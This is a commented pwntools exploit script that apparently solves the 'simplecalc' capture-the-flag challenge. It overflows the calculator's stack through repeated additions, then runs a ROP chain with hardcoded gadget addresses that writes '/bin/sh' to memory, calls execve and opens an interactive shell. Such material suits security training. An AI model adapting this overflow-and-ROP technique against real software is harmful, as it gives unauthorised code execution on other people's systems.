from pwn import *

# Start the vulnerable program
target = process('./simplecalc')

# Wait for the prompt
target.recvuntil('Expected number of calculations: ')

# Tell it we want to do 100 calculations (we won't use all of them)
target.sendline('100')

# Define helper function to send values through addition
def addSingle(x):
    target.recvuntil("=> ")
    target.sendline("1")  # Choose addition
    target.recvuntil("Integer x: ")
    target.sendline("100")
    target.recvuntil("Integer y: ")
    target.sendline(str(x - 100))

def add(z):
    # Split 64-bit value into two 32-bit integers
    x = z & 0xffffffff
    y = ((z & 0xffffffff00000000) >> 32)
    addSingle(x)
    addSingle(y)

# ROP gadget addresses (we found these with ROPgadget tool)
popRax = 0x44db34
popRdi = 0x401b73
popRsi = 0x401c87
popRdx = 0x437a85
movGadget = 0x44526e
syscall = 0x400488

# Fill first 72 bytes with nulls (reach return address)
for i in range(9):
    add(0x0)

# ROP chain to write "/bin/sh" to memory at 0x6c1000
add(popRax)
add(0x6c1000)
add(popRdx)
add(0x0068732f6e69622f)  # "/bin/sh" in hex
add(movGadget)

# ROP chain to execute execve("/bin/sh", NULL, NULL)
add(popRax)
add(0x3b)  # execve syscall number
add(popRdi)
add(0x6c1000)  # pointer to "/bin/sh"
add(popRsi)
add(0x0)
add(popRdx)
add(0x0)
add(syscall)

# Trigger the overflow by choosing "Save and Exit"
target.sendline('5')

# Drop to interactive shell
target.interactive()